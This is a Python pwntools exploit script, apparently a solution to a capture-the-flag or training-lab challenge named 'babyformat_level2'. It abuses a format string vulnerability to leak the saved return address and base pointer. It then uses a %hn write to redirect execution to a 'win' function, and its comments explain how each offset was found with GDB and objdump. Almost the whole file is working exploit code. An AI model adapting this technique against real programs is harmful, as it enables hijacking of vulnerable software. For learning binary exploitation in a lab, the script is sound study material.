from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/challenge/babyformat_level2')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

# Using disassemble func, get the offset of printf (+368)
# Set a breakpoint -> b *func+368, run the function -> r
# [(x/gx $rbp + 8) - (x/gx $rsp)]/8 --> Answer + 6 (because of 6th pos argument)
# [1544/8] + 6 -> 199
# saved rip present at 199th argument
exploit1 = b'%199$lx'

io.send(exploit1)
io.recvuntil('input is:')
io.recvline()

# return address retrieved
ret_address = int(io.recvline(keepends = False),16)

# because ret address is very long, buffer might not be able to print all 0s due to memory issues.. so we only take last 4 bytes. (Last Nibble)
print(hex(ret_address)[-4:])
ret_int =  int(hex(ret_address)[-4:],16)

# offset calculation by doing objdump on the binary. First search for func inside main and get the next line's address, then subtract win's address from it --> 1735 - 1330 -> 1029
win_address = ret_int - 1029
print(hex(win_address))
print(len(str(win_address)))

# saved rbp at 198th argument (stored in rbp) [because saved rip is at 199th. so saved rbp one argument behind]
exploit2 = b'%198$lx'
io.send(exploit2)
io.recvuntil('input is:')
io.recvline()

# retrieved rbp's address
rbp_address = int(io.recvline(keepends = False),16)
print(hex(rbp_address))

# final format string.. so pass %0.. then because we already have 122 chars because of "Your input is...... \n" --> 107 + 15 chars of "your input is.." + 1 char of \n

# (x/gx $rdi - x/gx $rsp) --> 480/8 --> 60 
# Add 15 bytes to fit 122 chars (122/8 -> 15) + 6 bytes for pos arg. total --> 15 + 60 + 6 --> 81

# 2 more bytes to fit this format string itself..(because out of 122 only 120 will be completely written.. rest 2 will go in the next byte. so we need to start writing the format string in this partial byte.. then keep writing it until we reach the end of a byte) --> 81 + 2 --> 83 bytes

# saved rbp and rbp+8.. have constant offset of 72.. so to find rbp + 8, we sub 72..

# depending on the length of the win.. we might need to add some more padding .. in this case its 0, for challenge 3 we need to print the len of win.. and make appropriate calculation to find the part after the format string
exploit3 = b'%0'+ str(win_address-122).encode() + b'd%83$hn' +  b'a'*(5-len(str(win_address))) + p64(rbp_address-72)
io.send(exploit3)
io.interactive()

io.interactive()

